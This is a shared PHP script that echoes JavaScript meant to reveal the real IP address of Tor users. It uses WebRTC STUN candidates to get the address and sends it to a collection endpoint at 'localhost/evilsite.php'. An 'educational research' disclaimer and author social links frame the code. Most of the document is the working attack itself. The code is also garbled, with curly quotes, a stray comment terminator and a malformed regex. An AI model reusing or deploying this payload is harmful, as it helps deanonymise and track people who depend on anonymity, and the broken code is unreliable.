#######################################################################################################################################################################
Warning This Code Contains Malicious Scripting Use With Caution
#######################################################################################################################################################################
This malicious script is designed to obtain a user's home IP address by bypassing the exit node of a TOR network. It begins by setting various PHP parameters such as error reporting, max execution time, and display errors to 0 in order to prevent detection. It then creates a JavaScript function that uses the RTPDataChannels feature to obtain the user's IP address. The code also contains a 'httpGet' function which sends an HTTP request and returns the response. Finally, the code echoes the malicious script, which attempts to obtain the IP address and send it to a server at 'localhost/evilsite.php?IP='. This malicious script can be used to gather information about a user's online activity, which can be used to track them or gain unauthorized access to their system.
#######################################################################################################################################################################
Use this code at your own risk the author of this code is not subject to what you do with the following code that is listed below this is for educational research....
#######################################################################################################################################################################
<?php
error_reporting(0);
set_time_limit(0);
ini_set(‘display_errors’, 0);
ini_set(‘max_execution_time’, 0);
*/
$exploit = “
<script type=’text/javascript’>
httpGet(‘http://localhost/evilsite.php?IP=[ IP START ]’) // Obtaining tor users home ip bypassing exit node
var ip2 = ‘’;
function getIPs(callback) {
var ip_dups = {};
var RTCPeerConnection = window.RTCPeerConnection
|| window.mozRTCPeerConnection
|| window.webkitRTCPeerConnection;
var mediaConstraints = {
optional: [{RtpDataChannels: true}]
};
// media.peerconnection.default_iceservers =
// [{‘url’: ‘stun:stun.services.mozilla.com’}]
var servers = undefined;
if (window.webkitRTCPeerConnection)
servers = {iceServers: [{urls: ‘stun:stun.services.mozilla.com’}]};
/construct a new RTCPeerConnection
var pc = new RTCPeerConnection(servers, mediaConstraints);
pc.onicecandidate = function(ice) {
if (ice.candidate) {
var ip_regex = /([0–9]{1,3}(\.[0–9]{1,3}){3})/;
var ip_addr = ip_regex.exec(ice.candidate.candidate)[1];
if (ip_dups[ip_addr] === undefined)
callback(ip_addr);
ip_dups[ip_addr] = true;
}
};
pc.createDataChannel(‘’);
pc.createOffer(function(result) {
pc.setLocalDescription(result, function() {
}, function() {
});
}, function() {
});
}
getIPs(function(ip) {
envior(ip); //SUB PROCESSO
}
);
function httpGet(url)
{
var xmlHttp = null;
xmlHttp = new XMLHttpRequest();
xmlHttp.open(‘GET’, url, false);
xmlHttp.send(null);
return xmlHttp.responseText;
}
function envior(valor) {
ip2 = ‘ — ‘ + valor.toString();
document.write(httpGet(‘http://localhost/evilsite.php?IP=’ + ip2));
}
</script>”;
echo $exploit;
#######################################################################################################################################################################

Twitter.com/ClumsyLulz | Youtube.com/Stripped | Pastebin.com/u/Sleep | Linkdin.com/in/Clumsy | G.Dev/Trap | Allmylinks.com/Malware
